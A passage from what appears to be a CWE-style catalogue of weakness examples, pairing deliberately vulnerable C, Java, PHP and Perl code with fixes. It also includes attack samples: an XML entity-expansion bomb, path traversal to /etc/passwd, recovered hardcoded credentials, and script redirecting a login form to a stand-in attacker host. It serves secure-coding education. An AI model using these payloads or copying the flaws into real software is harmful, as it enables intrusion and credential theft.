if ((strlen(username) > MAX_USERNAME_LENGTH) ||
(strlen(password) > MAX_PASSWORD_LENGTH)) {
ExitError(""Invalid username or password"");
}

                                 
// if the username and password in the input parameters are equal to

                                 

                                 

                                 
// the username and password of this account class then authorize access

                                 
if (strcmp(this->username, username) ||
strcmp(this->password, password))
return 0;

                                 

                                 
// otherwise do not authorize access

                                 
else
return 1;

                              

                           
}

                           
char username[MAX_USERNAME_LENGTH+1];
char password[MAX_PASSWORD_LENGTH+1];

                     
};

               
example: 4
NATURE:good:
LANGUAGE:C++:
                  
class UserAccount
{
public:
...

                     

                     
private:
char username[MAX_USERNAME_LENGTH+1];
char password[MAX_PASSWORD_LENGTH+1];
};

               "
767,"
example: 1
NATURE:bad:
LANGUAGE:C++:
                  
private: float price;
public: void changePrice(float newPrice) {
price = newPrice;
}

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
public class Client {
private int UID;
public int PID;
private String userName;
public Client(String userName){
PID = getDefaultProfileID();
UID = mapUserNametoUID( userName );
this.userName = userName;
}
public void setPID(int ID) {
UID = ID;
}
}

               "
768,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
#define PRIV_ADMIN 0
#define PRIV_REGULAR 1
typedef struct{
int privileges;
int id;
} user_t;
user_t *Add_Regular_Users(int num_users){
user_t* users = (user_t*)calloc(num_users, sizeof(user_t));
int i = num_users;
while( --i && (users[i].privileges = PRIV_REGULAR) ){
users[i].id = i;
}
return users;
}
int main(){
user_t* test;
int i;
test = Add_Regular_Users(25);
for(i = 0; i < 25; i++) printf(""user %d has privilege level %d\n"", test[i].id, test[i].privileges);
}

               "
770,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
sock=socket(AF_INET, SOCK_STREAM, 0);
while (1) {
newsock=accept(sock, ...);
printf(""A connection has been accepted\n"");
pid = fork();
}

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
int writeDataFromSocketToFile(char *host, int port)
{

                        

                           
char filename[FILENAME_SIZE];
char buffer[BUFFER_SIZE];
int socket = openSocketConnection(host, port);

                           
if (socket < 0) {
printf(""Unable to open socket connection"");
return(FAIL);
}
if (getNextMessage(socket, filename, FILENAME_SIZE) > 0) {

                              
if (openFileToWrite(filename) > 0) {

                                    
while (getNextMessage(socket, buffer, BUFFER_SIZE) > 0){
if (!(writeToFile(buffer) > 0))
break;

                                       
}

                                 
}
closeFile();

                           
}
closeSocket(socket);

                     
}

               
example: 3
NATURE:bad:
LANGUAGE:C:
                  

                     

                     
/* process message accepts a two-dimensional character array of the form [length][body] containing the message to be processed */

                     
int processMessage(char **message)
{

                        
char *body;

                           
int length = getMessageLength(message[0]);

                           
if (length > 0) {
body = &message[1][0];
processMessageBody(body);
return(SUCCESS);
}
else {
printf(""Unable to process message; invalid message length"");
return(FAIL);
}

                     
}

               
example: 4
NATURE:good:
LANGUAGE:C:
                  
unsigned int length = getMessageLength(message[0]);
if ((length > 0) && (length < MAX_LENGTH)) {...}

               
example: 5
NATURE:bad:
LANGUAGE:Java:
                  
public void acceptConnections() {

                     

                        
try {
ServerSocket serverSocket = new ServerSocket(SERVER_PORT);
int counter = 0;
boolean hasConnections = true;
while (hasConnections) {
Socket client = serverSocket.accept();
Thread t = new Thread(new ClientSocketThread(client));
t.setName(client.getInetAddress().getHostName() + "":"" + counter++);
t.start();
}
serverSocket.close();

                           

                           
} catch (IOException ex) {...}

                     
}

               
example: 6
NATURE:good:
LANGUAGE:Java:
                  
public static final int SERVER_PORT = 4444;
public static final int MAX_CONNECTIONS = 10;
...

                     
public void acceptConnections() {

                     

                        
try {
ServerSocket serverSocket = new ServerSocket(SERVER_PORT);
int counter = 0;
boolean hasConnections = true;
while (hasConnections) {
hasConnections = checkForMoreConnections();
Socket client = serverSocket.accept();
Thread t = new Thread(new ClientSocketThread(client));
t.setName(client.getInetAddress().getHostName() + "":"" + counter++);
ExecutorService pool = Executors.newFixedThreadPool(MAX_CONNECTIONS);
pool.execute(t);
}
serverSocket.close();

                           

                           
} catch (IOException ex) {...}

                     
}

               
example: 7
NATURE:bad:
LANGUAGE:C:
                  
bar connection() {
foo = malloc(1024);
return foo;
}
endConnection(bar foo) {
free(foo);
}
int main() {
while(1) {
foo=connection();
}
endConnection(foo)
}

               "
771,
772,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
private void processFile(string fName)
{
BufferReader in = new BufferReader(new FileReader(fName));
String line;
while ((line = in.ReadLine()) != null)
{
processLine(line);
}
}

               
example: 2
NATURE:bad:
LANGUAGE:C#:
                  
SqlConnection conn = new SqlConnection(connString);
SqlCommand cmd = new SqlCommand(queryString);
cmd.Connection = conn;
conn.Open();
SqlDataReader rdr = cmd.ExecuteReader();
HarvestResults(rdr);
conn.Connection.Close();

               
example: 3
NATURE:bad:
LANGUAGE:Java:
                  
private void processFile(string fName) {
StreamWriter sw = new StreamWriter(fName);
string line;
while ((line = sr.ReadLine()) != null){
processLine(line);
}
}

               
example: 4
NATURE:bad:
LANGUAGE:Java:
                  
try {
Connection con = DriverManager.getConnection(some_connection_string);
}
catch ( Exception e ) {
log( e );
}

               
example: 5
NATURE:bad:
LANGUAGE:C#:
                  
...
SqlConnection conn = new SqlConnection(connString);
SqlCommand cmd = new SqlCommand(queryString);
cmd.Connection = conn;
conn.Open();
SqlDataReader rdr = cmd.ExecuteReader();
HarvestResults(rdr);
conn.Connection.Close();
...

               
example: 6
NATURE:bad:
LANGUAGE:C:
                  
int decodeFile(char* fName) {

                        
char buf[BUF_SZ];
FILE* f = fopen(fName, ""r"");
if (!f) {
printf(""cannot open %s\n"", fName);
return DECODE_FAIL;
}
else {

                              
while (fgets(buf, BUF_SZ, f)) {
if (!checkChecksum(buf)) {
return DECODE_FAIL;
}
else {
decodeBlock(buf);
}
}

                           
}
fclose(f);
return DECODE_SUCCESS;

                     
}

               "
773,
774,
775,
776,"
example: 1
NATURE:attack:
LANGUAGE:XML:
                  
<?xml version=""1.0""?>
<!DOCTYPE MaliciousDTD [
<!ENTITY ZERO ""A"">
<!ENTITY ONE ""&ZERO;&ZERO;"">
<!ENTITY TWO ""&ONE;&ONE;"">
...
<!ENTITY THIRTYTWO ""&THIRTYONE;&THIRTYONE;"">
]>
<data>&THIRTYTWO;</data>

               "
777,"
example: 1
NATURE:bad:
LANGUAGE:PHP:
                  
$dir = ""/home/cwe/languages"";
$lang = $_GET['lang'];
if (preg_match(""/[A-Za-z0-9]+/"", $lang)) {
include(""$dir/$lang"");
}
else {
echo ""You shall not pass!\n"";
}

               
example: 2
NATURE:attack:
                  
../../etc/passwd

               "
778,"
example: 1
NATURE:bad:
LANGUAGE:XML:
                  
<system.serviceModel>
<behaviors>
<serviceBehaviors>
<behavior name=""NewBehavior"">
<serviceSecurityAudit auditLogLocation=""Default""
suppressAuditFailure=""false""
serviceAuthorizationAuditLevel=""None""
messageAuthenticationAuditLevel=""None"" />

                              
...

                           

                        

                     
</system.serviceModel>

               
example: 2
NATURE:good:
LANGUAGE:XML:
                  
<system.serviceModel>
<behaviors>
<serviceBehaviors>
<behavior name=""NewBehavior"">
<serviceSecurityAudit auditLogLocation=""Default""
suppressAuditFailure=""false""
serviceAuthorizationAuditLevel=""SuccessAndFailure""
messageAuthenticationAuditLevel=""SuccessAndFailure"" />

                              
...

                           

                        

                     
</system.serviceModel>

               "
779,
780,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
public Cipher getRSACipher() {
Cipher rsa = null;
try {
rsa = javax.crypto.Cipher.getInstance(""RSA/NONE/NoPadding"");
}
catch (java.security.NoSuchAlgorithmException e) {
log(""this should never happen"", e);
}
catch (javax.crypto.NoSuchPaddingException e) {
log(""this should never happen"", e);
}
return rsa;
}

               
example: 2
NATURE:good:
LANGUAGE:Java:
                  
public Cipher getRSACipher() {
Cipher rsa = null;
try {
rsa = javax.crypto.Cipher.getInstance(""RSA/ECB/OAEPWithMD5AndMGF1Padding"");
}
catch (java.security.NoSuchAlgorithmException e) {
log(""this should never happen"", e);
}
catch (javax.crypto.NoSuchPaddingException e) {
log(""this should never happen"", e);
}
return rsa;
}

               "
781,
782,
783,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
#define FAIL 0
#define SUCCESS 1

                     
...

                     
int validateUser(char *username, char *password) {

                        

                           
int isUser = FAIL;

                           

                           
// call method to authenticate username and password

                           

                           

                           
// if authentication fails then return failure otherwise return success

                           
if (isUser = AuthenticateUser(username, password) == FAIL) {
return isUser;
}
else {
isUser = SUCCESS;
}

                           
return isUser;

                     
}

               
example: 2
NATURE:good:
LANGUAGE:C:
                  
...

                     
if ((isUser = AuthenticateUser(username, password)) == FAIL) {

                     
...

               
example: 3
NATURE:bad:
LANGUAGE:Java:
                  
public double calculateReturnOnInvestment(double currentValue, double initialInvestment) {

                        

                           
double returnROI = 0.0;

                           

                           
// calculate return on investment

                           
returnROI = currentValue - initialInvestment / initialInvestment;

                           
return returnROI;

                     
}

               
example: 4
NATURE:good:
LANGUAGE:Java:
                  
...

                     
returnROI = (currentValue - initialInvestment) / initialInvestment;

                     
...

               "
784,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
Cookie[] cookies = request.getCookies();
for (int i =0; i< cookies.length; i++) {
Cookie c = cookies[i];
if (c.getName().equals(""role"")) {
userRole = c.getValue();
}
}

               
example: 2
NATURE:bad:
LANGUAGE:PHP:
                  
$auth = $_COOKIES['authenticated'];
if (! $auth) {

                        
if (AuthenticateUser($_POST['user'], $_POST['password']) == ""success"") {

                              

                                 

                                 
// save the cookie to send out in future responses

                                 
setcookie(""authenticated"", ""1"", time()+60*60*2);

                           
}
else {
ShowLoginScreen();
die(""\n"");
}

                     
}
DisplayMedicalHistory($_POST['patient_ID']);

               
example: 3
NATURE:bad:
LANGUAGE:Java:
                  
Cookie[] cookies = request.getCookies();
for (int i =0; i< cookies.length; i++) {
Cookie c = cookies[i];
if (c.getName().equals(""authenticated"") && Boolean.TRUE.equals(c.getValue())) {
authenticated = true;
}
}

               "
785,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
char *createOutputDirectory(char *name) {

                        
char outputDirectoryName[128];
if (getCurrentDirectory(128, outputDirectoryName) == 0) {
return null;
}
if (!PathAppend(outputDirectoryName, ""output"")) {
return null;
}
if (!PathAppend(outputDirectoryName, name)) {

                              

                                 
return null;

                           
}
if (SHCreateDirectoryEx(NULL, outputDirectoryName, NULL) != ERROR_SUCCESS) {

                              

                                 
return null;

                           
}
return StrDup(outputDirectoryName);

                     
}

               "
786,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
char* trimTrailingWhitespace(char *strMessage, int length) {

                        
char *retMessage;
char *message = malloc(sizeof(char)*(length+1));

                           

                           
// copy input string to a temporary string

                           
char message[length+1];
int index;
for (index = 0; index < length; index++) {
message[index] = strMessage[index];
}
message[index] = '\0';

                           

                           
// trim trailing whitespace

                           
int len = index-1;
while (isspace(message[len])) {
message[len] = '\0';
len--;
}

                           

                           
// return string without trailing whitespace

                           
retMessage = message;
return retMessage;

                     
}

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  

                     
int main (int argc, char **argv) {
char *items[] = {""boat"", ""car"", ""truck"", ""train""};
int index = GetUntrustedOffset();
printf(""You selected %s\n"", items[index-1]);
}

               
example: 3
NATURE:bad:
LANGUAGE:C:
                  
int main() {
...
strncpy(destBuf, &srcBuf[find(srcBuf, ch)], 1024);
...
}

               "
787,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
int id_sequence[3];

                     
/* Populate the id array. */

                     
id_sequence[0] = 123;
id_sequence[1] = 234;
id_sequence[2] = 345;
id_sequence[3] = 456;

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
int returnChunkSize(void *) {

                        

                           

                           
/* if chunk info is valid, return the size of usable memory,

                           

                           

                           
* else, return -1 to indicate an error

                           

                           

                           
*/

                           
...

                     
}
int main() {
...
memcpy(destBuf, srcBuf, (returnChunkSize(destBuf)-1));
...
}

               "
788,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
void host_lookup(char *user_supplied_addr){

                        
struct hostent *hp;
in_addr_t *addr;
char hostname[64];
in_addr_t inet_addr(const char *cp);

                           

                           
/*routine that ensures user_supplied_addr is in the right format for conversion */

                           

                           
validate_addr_form(user_supplied_addr);
addr = inet_addr(user_supplied_addr);
hp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET);
strcpy(hostname, hp->h_name);

                     
}

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
int returnChunkSize(void *) {

                        

                           

                           
/* if chunk info is valid, return the size of usable memory,

                           

                           

                           
* else, return -1 to indicate an error

                           

                           

                           
*/

                           
...

                     
}
int main() {
...
memcpy(destBuf, srcBuf, (returnChunkSize(destBuf)-1));
...
}

               
example: 3
NATURE:bad:
LANGUAGE:C:
                  
char * copy_input(char *user_supplied_string){

                        
int i, dst_index;
char *dst_buf = (char*)malloc(4*sizeof(char) * MAX_SIZE);
if ( MAX_SIZE <= strlen(user_supplied_string) ){
die(""user string too long, die evil hacker!"");
}
dst_index = 0;
for ( i = 0; i < strlen(user_supplied_string); i++ ){

                              
if( '&' == user_supplied_string[i] ){
dst_buf[dst_index++] = '&';
dst_buf[dst_index++] = 'a';
dst_buf[dst_index++] = 'm';
dst_buf[dst_index++] = 'p';
dst_buf[dst_index++] = ';';
}
else if ('<' == user_supplied_string[i] ){

                                    

                                       

                                       
/* encode to &lt; */

                                       

                                    

                                 
}
else dst_buf[dst_index++] = user_supplied_string[i];

                           
}
return dst_buf;

                     
}

               
example: 4
NATURE:bad:
LANGUAGE:C:
                  
int processMessageFromSocket(int socket) {

                        
int success;

                           
char buffer[BUFFER_SIZE];
char message[MESSAGE_SIZE];

                           

                           
// get message from socket and store into buffer

                           

                           

                           
//Ignoring possibliity that buffer > BUFFER_SIZE

                           
if (getMessage(socket, buffer, BUFFER_SIZE) > 0) {

                              

                                 

                                 
// place contents of the buffer into message structure

                                 
ExMessage *msg = recastBuffer(buffer);

                                 

                                 
// copy message body into string for processing

                                 
int index;
for (index = 0; index < msg->msgLength; index++) {
message[index] = msg->msgBody[index];
}
message[index] = '\0';

                                 

                                 
// process message

                                 
success = processMessage(message);

                           
}
return success;

                     
}

               "
789,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
unsigned int size = GetUntrustedInt();

                     
/* ignore integer overflow (CWE-190) for this example */

                     

                     
unsigned int totBytes = size * sizeof(char);
char *string = (char *)malloc(totBytes);
InitializeString(string);

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
unsigned int size = GetUntrustedInt();
HashMap list = new HashMap(size);

               
example: 3
NATURE:bad:
LANGUAGE:Perl:
                  
my $num = GetUntrustedNumber();
my @messages = ();

                     
$messages[$num] = ""Hello World"";

               "
790,"
example: 1
NATURE:bad:
LANGUAGE:Perl:
                  
my $Username = GetUntrustedInput();
$Username =~ s/\.\.\///;
my $filename = ""/home/user/"" . $Username;
ReadAndSendFile($filename);

               
example: 2
NATURE:attack:
                  
../../../etc/passwd

               
example: 3
NATURE:result:
                  
../../etc/passwd

               
example: 4
NATURE:result:
                  
/home/user/../../etc/passwd

               "
791,"
example: 1
NATURE:bad:
LANGUAGE:Perl:
                  
my $Username = GetUntrustedInput();
$Username =~ s/\.\.\///;
my $filename = ""/home/user/"" . $Username;
ReadAndSendFile($filename);

               
example: 2
NATURE:attack:
                  
../../../etc/passwd

               
example: 3
NATURE:result:
                  
../../etc/passwd

               
example: 4
NATURE:result:
                  
/home/user/../../etc/passwd

               "
792,"
example: 1
NATURE:bad:
LANGUAGE:Perl:
                  
my $Username = GetUntrustedInput();
$Username =~ s/\.\.\///;
my $filename = ""/home/user/"" . $Username;
ReadAndSendFile($filename);

               
example: 2
NATURE:attack:
                  
../../../etc/passwd

               
example: 3
NATURE:result:
                  
../../etc/passwd

               
example: 4
NATURE:result:
                  
/home/user/../../etc/passwd

               "
793,"
example: 1
NATURE:bad:
LANGUAGE:Perl:
                  
my $Username = GetUntrustedInput();
$Username =~ s/\.\.\///;
my $filename = ""/home/user/"" . $Username;
ReadAndSendFile($filename);

               
example: 2
NATURE:attack:
                  
../../../etc/passwd

               
example: 3
NATURE:result:
                  
../../etc/passwd

               
example: 4
NATURE:result:
                  
/home/user/../../etc/passwd

               "
794,"
example: 1
NATURE:bad:
LANGUAGE:Perl:
                  
my $Username = GetUntrustedInput();
$Username =~ s/\.\.\///;
my $filename = ""/home/user/"" . $Username;
ReadAndSendFile($filename);

               
example: 2
NATURE:attack:
                  
../../../etc/passwd

               
example: 3
NATURE:result:
                  
../../etc/passwd

               
example: 4
NATURE:result:
                  
/home/user/../../etc/passwd

               "
795,"
example: 1
NATURE:bad:
LANGUAGE:Perl:
                  
my $Username = GetUntrustedInput();
$Username =~ s/^\.\.\///;
my $filename = ""/home/user/"" . $Username;
ReadAndSendFile($filename);

               
example: 2
NATURE:attack:
                  
../../../etc/passwd

               
example: 3
NATURE:result:
                  
../../etc/passwd

               
example: 4
NATURE:result:
                  
/home/user/../../etc/passwd

               "
796,"
example: 1
NATURE:bad:
LANGUAGE:Perl:
                  
my $Username = GetUntrustedInput();
$Username =~ s/^\.\.\///;
my $filename = ""/home/user/"" . $Username;
ReadAndSendFile($filename);

               
example: 2
NATURE:attack:
                  
../../../etc/passwd

               
example: 3
NATURE:result:
                  
../../etc/passwd

               
example: 4
NATURE:result:
                  
/home/user/../../etc/passwd

               "
797,"
example: 1
NATURE:bad:
LANGUAGE:Perl:
                  
my $Username = GetUntrustedInput();
if (substr($Username, 0, 3) eq '../') {
$Username = substr($Username, 3);
}
my $filename = ""/home/user/"" . $Username;
ReadAndSendFile($filename);

               
example: 2
NATURE:attack:
                  
../../../etc/passwd

               
example: 3
NATURE:result:
                  
../../etc/passwd

               
example: 4
NATURE:result:
                  
/home/user/../../etc/passwd

               "
798,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
...
DriverManager.getConnection(url, ""scott"", ""tiger"");
...

               
example: 2
NATURE:attack:
                  
javap -c ConnMngr.class
22: ldc #36; //String jdbc:mysql://ixne.com/rxsql
24: ldc #38; //String scott
26: ldc #17; //String tiger

                  

               
example: 3
NATURE:bad:
LANGUAGE:C:
                  
int VerifyAdmin(char *password) {

                        
if (strcmp(password, ""Mew!"")) {

                              

                                 
printf(""Incorrect Password!\n"");
return(0)

                           
}
printf(""Entering Diagnostic Mode...\n"");
return(1);

                     
}

               
example: 4
NATURE:bad:
LANGUAGE:Java:
                  
int VerifyAdmin(String password) {
if (passwd.Equals(""Mew!"")) {
return(0)
}
//Diagnostic Mode
return(1);
}

               
example: 5
NATURE:bad:
LANGUAGE:C:
                  
int VerifyAdmin(char *password) {

                        
if (strcmp(password,""68af404b513073584c4b6f22b6c63e6b"")) {

                              

                                 
printf(""Incorrect Password!\n"");
return(0);

                           
}
printf(""Entering Diagnostic Mode...\n"");
return(1);

                     
}

               
example: 6
NATURE:bad:
LANGUAGE:Java:
                  
public boolean VerifyAdmin(String password) {
if (password.equals(""68af404b513073584c4b6f22b6c63e6b"")) {
System.out.println(""Entering Diagnostic Mode..."");
return true;
}
System.out.println(""Incorrect Password!"");
return false;

                  

               
example: 7
NATURE:bad:
LANGUAGE:C#:
                  
int VerifyAdmin(String password) {
if (password.Equals(""68af404b513073584c4b6f22b6c63e6b"")) {
Console.WriteLine(""Entering Diagnostic Mode..."");
return(1);
}
Console.WriteLine(""Incorrect Password!"");
return(0);
}

               
example: 8
NATURE:bad:
LANGUAGE:Java:
                  

                     

                     
# Java Web App ResourceBundle properties file

                     
...
webapp.ldap.username=secretUsername
webapp.ldap.password=secretPassword
...

               
example: 9
NATURE:bad:
LANGUAGE:ASP.NET:
                  
...
<connectionStrings>
<add name=""ud_DEV"" connectionString=""connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;"" providerName=""System.Data.Odbc"" />
</connectionStrings>
...

               "
799,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
char username[USERNAME_SIZE];
char password[PASSWORD_SIZE];

                     
while (isValidUser == 0) {

                        
if (getNextMessage(socket, username, USERNAME_SIZE) > 0) {
if (getNextMessage(socket, password, PASSWORD_SIZE) > 0) {
isValidUser = AuthenticateUser(username, password);
}
}

                     
}
return(SUCCESS);

               
example: 2
NATURE:good:
LANGUAGE:C:
                  
int count = 0;
while ((isValidUser == 0) && (count < MAX_ATTEMPTS)) {

                        
if (getNextMessage(socket, username, USERNAME_SIZE) > 0) {
if (getNextMessage(socket, password, PASSWORD_SIZE) > 0) {
isValidUser = AuthenticateUser(username, password);
}
}
count++;

                     
}
if (isValidUser) {
return(SUCCESS);
}
else {
return(FAIL);
}

               "
804,
805,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
void host_lookup(char *user_supplied_addr){

                        
struct hostent *hp;
in_addr_t *addr;
char hostname[64];
in_addr_t inet_addr(const char *cp);

                           

                           
/*routine that ensures user_supplied_addr is in the right format for conversion */

                           

                           
validate_addr_form(user_supplied_addr);
addr = inet_addr(user_supplied_addr);
hp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET);
strcpy(hostname, hp->h_name);

                     
}

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
int returnChunkSize(void *) {

                        

                           

                           
/* if chunk info is valid, return the size of usable memory,

                           

                           

                           
* else, return -1 to indicate an error

                           

                           

                           
*/

                           
...

                     
}
int main() {
...
memcpy(destBuf, srcBuf, (returnChunkSize(destBuf)-1));
...
}

               
example: 3
NATURE:bad:
LANGUAGE:C:
                  
...
char source[21] = ""the character string"";
char dest[12];
strncpy(dest, source, sizeof(source)-1);
...

               
example: 4
NATURE:good:
LANGUAGE:C:
                  
...
char source[21] = ""the character string"";
char dest[12];
strncpy(dest, source, sizeof(dest)-1);
...

               
example: 5
NATURE:bad:
LANGUAGE:C:
                  
#define LOG_INPUT_SIZE 40

                     

                     
// saves the file name to a log file

                     
int outputFilenameToLog(char *filename, int length) {

                        
int success;

                           

                           
// buffer with size set to maximum size for input to log file

                           
char buf[LOG_INPUT_SIZE];

                           

                           
// copy filename to buffer

                           
strncpy(buf, filename, length);

                           

                           
// save to log file

                           
success = saveToLogFile(buf);

                           
return success;

                     
}

               
example: 6
NATURE:good:
LANGUAGE:C:
                  
...

                     
// copy filename to buffer

                     
strncpy(buf, filename, sizeof(buf)-1);
...

               "
806,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
...
char source[21] = ""the character string"";
char dest[12];
strncpy(dest, source, sizeof(source)-1);
...

               
example: 2
NATURE:good:
LANGUAGE:C:
                  
...
char source[21] = ""the character string"";
char dest[12];
strncpy(dest, source, sizeof(dest)-1);
...

               
example: 3
NATURE:bad:
LANGUAGE:C:
                  
#define LOG_INPUT_SIZE 40

                     

                     
// saves the file name to a log file

                     
int outputFilenameToLog(char *filename, int length) {

                        
int success;

                           

                           
// buffer with size set to maximum size for input to log file

                           
char buf[LOG_INPUT_SIZE];

                           

                           
// copy filename to buffer

                           
strncpy(buf, filename, length);

                           

                           
// save to log file

                           
success = saveToLogFile(buf);

                           
return success;

                     
}

               
example: 4
NATURE:good:
LANGUAGE:C:
                  
...

                     
// copy filename to buffer

                     
strncpy(buf, filename, sizeof(buf)-1);
...

               "
807,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
Cookie[] cookies = request.getCookies();
for (int i =0; i< cookies.length; i++) {
Cookie c = cookies[i];
if (c.getName().equals(""role"")) {
userRole = c.getValue();
}
}

               
example: 2
NATURE:bad:
LANGUAGE:PHP:
                  
$auth = $_COOKIES['authenticated'];
if (! $auth) {
if (AuthenticateUser($_POST['user'], $_POST['password']) == ""success"") {
// save the cookie to send out in future responses
setcookie(""authenticated"", ""1"", time()+60*60*2);
}
else {
ShowLoginScreen();
die(""\n"");
}
}
DisplayMedicalHistory($_POST['patient_ID']);

               
example: 3
NATURE:bad:
LANGUAGE:Java:
                  
Cookie[] cookies = request.getCookies();
for (int i =0; i< cookies.length; i++) {
Cookie c = cookies[i];
if (c.getName().equals(""authenticated"") && Boolean.TRUE.equals(c.getValue())) {
authenticated = true;
}
}

               
example: 4
NATURE:bad:
LANGUAGE:C:
                  
struct hostent *hp;struct in_addr myaddr;
char* tHost = ""trustme.example.com"";
myaddr.s_addr=inet_addr(ip_addr_string);

                     
hp = gethostbyaddr((char *) &myaddr, sizeof(struct in_addr), AF_INET);
if (hp && !strncmp(hp->h_name, tHost, sizeof(tHost))) {
trusted = true;
} else {
trusted = false;
}

               
example: 5
NATURE:bad:
LANGUAGE:Java:
                  
String ip = request.getRemoteAddr();
InetAddress addr = InetAddress.getByName(ip);
if (addr.getCanonicalHostName().endsWith(""trustme.com"")) {
trusted = true;
}

               
example: 6
NATURE:bad:
LANGUAGE:C#:
                  
IPAddress hostIPAddress = IPAddress.Parse(RemoteIpAddress);
IPHostEntry hostInfo = Dns.GetHostByAddress(hostIPAddress);
if (hostInfo.HostName.EndsWith(""trustme.com"")) {
trusted = true;
}

               "
820,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
static void print (char * string) {

                        
char * word;
int counter;
for (word = string; counter = *word++; ) {

                              
putc(counter, stdout);
fflush(stdout);

                                 
/* Make timing window a little larger... */

                                 

                                 
sleep(1);

                           
}

                     
}

                     
int main(void) {

                        
pid_t pid;

                           
pid = fork();
if (pid == -1) {
exit(-2);
}
else if (pid == 0) {
print(""child\n"");
}
else {
print(""PARENT\n"");
}
exit(0);

                     
}

               "
821,
822,
823,
824,
825,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
char* ptr = (char*)malloc (SIZE);
if (err) {
abrt = 1;
free(ptr);
}
...
if (abrt) {
logError(""operation aborted before commit"", ptr);
}

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
char* ptr = (char*)malloc (SIZE);
...
if (abrt) {
free(ptr);
}
...
free(ptr);

               "
826,
827,
828,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
char *logMessage;

                     
void handler (int sigNum) {

                        
syslog(LOG_NOTICE, ""%s\n"", logMessage);
free(logMessage);

                           
/* artificially increase the size of the timing window to make demonstration of this weakness easier. */

                           

                           
sleep(10);
exit(0);

                     
}

                     
int main (int argc, char* argv[]) {

                        
logMessage = strdup(argv[1]);

                           
/* Register signal handlers. */

                           

                           
signal(SIGHUP, handler);
signal(SIGTERM, handler);

                           
/* artificially increase the size of the timing window to make demonstration of this weakness easier. */

                           

                           
sleep(10);

                     
}

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
#include <signal.h>
#include <syslog.h>
#include <string.h>
#include <stdlib.h>

                     
void *global1, *global2;
char *what;
void sh (int dummy) {

                        
syslog(LOG_NOTICE,""%s\n"",what);
free(global2);
free(global1);

                           
/* Sleep statements added to expand timing window for race condition */

                           

                           
sleep(10);
exit(0);

                     
}

                     
int main (int argc,char* argv[]) {

                        
what=argv[1];
global1=strdup(argv[2]);
global2=malloc(340);
signal(SIGHUP,sh);
signal(SIGTERM,sh);

                           
/* Sleep statements added to expand timing window for race condition */

                           

                           
sleep(10);
exit(0);

                     
}

               "
829,"
example: 1
NATURE:bad:
LANGUAGE:HTML:
                  
<div class=""header""> Welcome!
<div id=""loginBox"">Please Login:
<form id =""loginForm"" name=""loginForm"" action=""login.php"" method=""post"">
Username: <input type=""text"" name=""username"" />
<br/>
Password: <input type=""password"" name=""password"" />
<input type=""submit"" value=""Login"" />
</form>
</div>
<div id=""WeatherWidget"">
<script type=""text/javascript"" src=""externalDomain.example.com/weatherwidget.js""></script>
</div>
</div>

               
example: 2
NATURE:attack:
LANGUAGE:JavaScript:
                  

                     

                     
...Weather widget code....

                     
document.getElementById('loginForm').action = ""ATTACK.example.com/stealPassword.php"";

               "
830,"
example: 1
NATURE:bad:
LANGUAGE:HTML:
                  
<div class=""header""> Welcome!
<div id=""loginBox"">Please Login:
<form id =""loginForm"" name=""loginForm"" action=""login.php"" method=""post"">
Username: <input type=""text"" name=""username"" />
<br/>
Password: <input type=""password"" name=""password"" />
<input type=""submit"" value=""Login"" />
</form>
</div>
<div id=""WeatherWidget"">
<script type=""text/javascript"" src=""externalDomain.example.com/weatherwidget.js""></script>
</div>
</div>

               
example: 2
NATURE:attack:
LANGUAGE:JavaScript:
                  

                     

                     
...Weather widget code....

                     
document.getElementById('loginForm').action = ""ATTACK.example.com/stealPassword.php"";

               "
831,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
void handler (int sigNum) {
...
}

                     
int main (int argc, char* argv[]) {
signal(SIGUSR1, handler)
signal(SIGUSR2, handler)
}

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
char *logMessage;

                     
void handler (int sigNum) {

                        
syslog(LOG_NOTICE, ""%s\n"", logMessage);
free(logMessage);

                           
/* artificially increase the size of the timing window to make demonstration of this weakness easier. */

                           

                           
sleep(10);
exit(0);

                     
}

                     
int main (int argc, char* argv[]) {

                        
logMessage = strdup(argv[1]);

                           
/* Register signal handlers. */

                           

                           
signal(SIGHUP, handler);
signal(SIGTERM, handler);

                           
/* artificially increase the size of the timing window to make demonstration of this weakness easier. */

                           

                           
sleep(10);

                     
}

               "
832,
833,
834,
835,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
int processMessagesFromServer(char *hostaddr, int port) {

                        
...
int servsock;
int connected;
struct sockaddr_in servaddr;

                           

                           
// create socket to connect to server

                           
servsock = socket( AF_INET, SOCK_STREAM, 0);
memset( &servaddr, 0, sizeof(servaddr));
servaddr.sin_family = AF_INET;
servaddr.sin_port = htons(port);
servaddr.sin_addr.s_addr = inet_addr(hostaddr);

                           
do {

                              

                                 

                                 
// establish connection to server

                                 
connected = connect(servsock, (struct sockaddr *)&servaddr, sizeof(servaddr));

                                 

                                 
// if connected then read and process messages from server

                                 
if (connected > -1) {

                                    

                                       

                                       
